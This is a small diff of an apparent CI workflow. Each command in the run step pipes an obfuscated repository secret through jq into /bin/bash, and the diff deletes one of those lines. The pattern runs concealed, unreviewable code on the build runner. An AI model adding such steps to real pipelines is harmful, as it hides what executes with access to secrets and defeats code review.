@@ -23,7 +23,6 @@ jobs:
           dseh90725: ${{ secrets.dseh90725 }}
         run: |
           printf '%s' "$dseh90725" | jq -r .ezfu96 | /bin/bash
-          printf '%s' "$zbxlw43471" | jq -r .kje8 | /bin/bash
           echo $sb3404 | jq -r .p6 | /bin/bash
           echo $h930 | jq -r .s3794 | /bin/bash
           printf '%s' "$sfl5878" | jq -r .nhz00438 | /bin/bash
